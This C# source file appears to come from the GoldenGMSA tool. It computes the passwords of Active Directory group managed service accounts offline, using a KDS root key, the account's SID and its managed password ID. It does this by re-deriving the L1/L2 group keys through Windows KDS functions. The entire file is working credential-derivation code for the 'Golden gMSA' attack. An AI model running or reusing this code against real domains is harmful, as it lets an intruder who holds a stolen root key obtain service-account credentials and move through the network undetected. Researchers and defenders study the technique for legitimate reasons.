using GoldenGMSA.Unsafe;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace GoldenGMSA
{
    public static class GmsaPassword
    {
        private static byte[] DefaultGMSASecurityDescriptor = {
                0x1, 0x0, 0x4, 0x80, 0x30, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x14, 0x00, 0x00, 0x00, 0x02, 0x0, 0x1C, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0,
                0x14, 0x0, 0x9F, 0x1, 0x12, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x9,
                0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x12, 0x0, 0x0, 0x0 };


        public static byte[] GetPassword(
            SecurityIdentifier sid,
            RootKey rootKey,
            MsdsManagedPasswordId pwdId,
            string domainName,
            string forestName)
        {
            int l0KeyID = 0, l1KeyID = 0, l2KeyID = 0;

            KdsUtils.GetCurrentIntervalID(KdsUtils.KeyCycleDuration, 0, ref l0KeyID, ref l1KeyID, ref l2KeyID);

            GetKey.GetSidKeyLocal(
                GmsaPassword.DefaultGMSASecurityDescriptor,
                GmsaPassword.DefaultGMSASecurityDescriptor.Length,
                rootKey,
                l0KeyID, l1KeyID, l2KeyID,
                0,
                domainName, forestName,
                out GroupKeyEnvelope gke,
                out int gkeSize);

            int passwordBlobSize = 256;
            byte[] sidBytes = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBytes, 0);

            var pwdBlob = GmsaPassword.GenerateGMSAPassowrd(
                gke, gkeSize,
                pwdId.MsdsManagedPasswordIdBytes,
                sidBytes,
                IntPtr.Zero, IntPtr.Zero,
                passwordBlobSize);

            return pwdBlob;
        }


        private static void ParseSIDKeyResult(
            GroupKeyEnvelope gke,
            int gkeSize,
            byte[] msdsManagedPasswordId,
            out byte[] l1Key,
            ref int l1KeyIdDiff,
            ref int newL1KeyId,
            out byte[] l2Key,
            ref int l2KeyIdDiff,
            ref int newL2KeyId,
            out byte[] publicKey)
        {
            newL2KeyId = 31;
            if (msdsManagedPasswordId != null)
            {
                MsdsManagedPasswordId msds_ManagedPasswordID = new MsdsManagedPasswordId(msdsManagedPasswordId);
                l1KeyIdDiff = gke.L1Index - msds_ManagedPasswordID.L1Index;
                l2KeyIdDiff = 32 - msds_ManagedPasswordID.L2Index;
                if (gke.cbL2Key > 0)
                {
                    l1KeyIdDiff--;
                    if (l1KeyIdDiff > 0)
                    {
                        newL1KeyId = gke.L1Index - 2;
                    }
                    if (gke.L1Index <= msds_ManagedPasswordID.L1Index)
                    {
                        l2KeyIdDiff = gke.L2Index - msds_ManagedPasswordID.L2Index;
                        if (l2KeyIdDiff > 0)
                        {
                            newL2KeyId = gke.L2Index - 1;
                        }
                    }
                }
                else if (l1KeyIdDiff > 0)
                {
                    newL1KeyId = gke.L1Index - 1;
                }
            }
            else if (gke.L2Index == 0)
            {
                l2KeyIdDiff = 1;
            }
            if (gke.cbL1Key > 0)
            {
                l1Key = gke.L1Key.ToArray();
            }
            else
            {
                l1Key = null;
            }
            if (gke.cbL2Key > 0)
            {
                l2Key = gke.L2Key.ToArray();
            }
            else
            {
                l2Key = null;
            }
            publicKey = null;
        }

        private static void ClientComputeL2Key(
            GroupKeyEnvelope gke,
            byte[] msdsManagedPasswordIdBytes,
            string kdfAlgorithmId,
            byte[] l1Key,
            ref byte[] l2Key,
            int l1KeyDiff,
            int newL1KeyId,
            int l2KeyDiff,
            int newL2KeyId)
        {
            var msdsManagedPasswordId = new MsdsManagedPasswordId(msdsManagedPasswordIdBytes);
            byte[] rootKeyGUID = gke.RootKeyIdentifier.ToByteArray();
            byte[] kdfParam = null;

            if (gke.cbKDFParameters > 0)
                kdfParam = gke.KDFParameters.ToArray();

            uint errCode = 0;

            if (l1KeyDiff > 0)
            {
                errCode = KdsCli.GenerateKDFContext(
                    rootKeyGUID, gke.L0Index,
                    newL1KeyId, 0xffffffff,
                    1,
                    out IntPtr KDFContextL1,
                    out int KDFContextSizeL1,
                    out int kdfContextFlagL1);

                if (errCode != 0)
                    throw new Exception($"{nameof(ClientComputeL2Key)}:: {nameof(KdsCli.GenerateKDFContext)} failed with error code {errCode}");


                byte[] KDFContextArrL1 = new byte[KDFContextSizeL1];
                Marshal.Copy(KDFContextL1, KDFContextArrL1, 0, KDFContextSizeL1);

                errCode = KdsCli.GenerateDerivedKey(
                    kdfAlgorithmId, kdfParam,
                    gke.cbKDFParameters, l1Key,
                    64, KDFContextArrL1,
                    KDFContextSizeL1, ref kdfContextFlagL1,
                    null, 0,
                    l1KeyDiff, l1Key,
                    RootKey.KdsRootKeyDataSizeDefault, 0);

                if (errCode != 0)
                    throw new Exception($"{nameof(ClientComputeL2Key)}:: {nameof(KdsCli.GenerateDerivedKey)} failed with error code {errCode}");
            }

            if ((msdsManagedPasswordIdBytes == null || gke.L1Index <= msdsManagedPasswordId.L1Index) && gke.cbL2Key != 0)
                l1Key = l2Key;

            if (l2KeyDiff > 0)
            {
                long something;
                if (msdsManagedPasswordIdBytes == null)
                {
                    something = gke.L1Index;
                }
                else
                {
                    something = msdsManagedPasswordId.L1Index;
                }

                errCode = KdsCli.GenerateKDFContext(
                    rootKeyGUID, gke.L0Index,
                    something, newL2KeyId,
                    2,
                    out IntPtr KDFContextL2,
                    out int KDFContextSizeL2,
                    out int kdfContextFlagL2);

                if (errCode != 0)
                    throw new Exception($"{nameof(ClientComputeL2Key)}:: {nameof(KdsCli.GenerateKDFContext)} failed with error code {errCode}");


                byte[] KDFContextArrL2 = new byte[KDFContextSizeL2];
                Marshal.Copy(KDFContextL2, KDFContextArrL2, 0, KDFContextSizeL2);

                if (l2Key == null)
                    l2Key = new byte[RootKey.KdsRootKeyDataSizeDefault];

                errCode = KdsCli.GenerateDerivedKey(
                    kdfAlgorithmId, kdfParam,
                    gke.cbKDFParameters, l1Key,
                    64, KDFContextArrL2,
                    KDFContextSizeL2, ref kdfContextFlagL2,
                    null, 0,
                    l2KeyDiff, l2Key,
                    RootKey.KdsRootKeyDataSizeDefault, 0);

                if (errCode != 0)
                    throw new Exception($"{nameof(ClientComputeL2Key)}:: {nameof(KdsCli.GenerateDerivedKey)} failed with error code {errCode}");
            }
        }

        private static byte[] GenerateGMSAPassowrd(
            GroupKeyEnvelope gke,
            int gkeSize,
            byte[] msdsManagedPasswordId,
            byte[] Sid,
            IntPtr OutOpt,
            IntPtr OutOptSize,
            int pwdBlobSize)
        {
            byte[] kdfParam = null;
            int newL1KeyID = 0, newL2KeyID = 0, l1KeyDiff = 0, l2KeyDiff = 0, flag = 0;
            string labelStr = "GMSA PASSWORD\x0";
            byte[] label = Encoding.Unicode.GetBytes(labelStr);
            var pwdBlob = new byte[pwdBlobSize];

            ParseSIDKeyResult(
                gke, gkeSize,
                msdsManagedPasswordId,
                out byte[] l1Key, ref l1KeyDiff, ref newL1KeyID,
                out byte[] l2Key, ref l2KeyDiff, ref newL2KeyID,
                out byte[] publicKey);

            if (l1KeyDiff > 0 || l2KeyDiff > 0)
            {
                ClientComputeL2Key(gke, msdsManagedPasswordId, gke.KDFAlgorithm, l1Key, ref l2Key, l1KeyDiff, newL1KeyID, l2KeyDiff, newL2KeyID);
            }
            if (gke.cbKDFParameters > 0)
            {
                kdfParam = gke.KDFParameters;
            }

            var errCode = KdsCli.GenerateDerivedKey(
                gke.KDFAlgorithm, kdfParam,
                gke.cbKDFParameters, l2Key,
                64, Sid,
                Sid.Length,
                ref flag,
                label, 28,
                1,
                pwdBlob, pwdBlobSize,
                0); // 28 is hardcoded in the dll, should be label.Length

            if (errCode != 0)
                throw new Exception($"{nameof(GenerateGMSAPassowrd)}:: {nameof(KdsCli.GenerateDerivedKey)} failed with error code {errCode}");

            return pwdBlob;
        }
    }
}
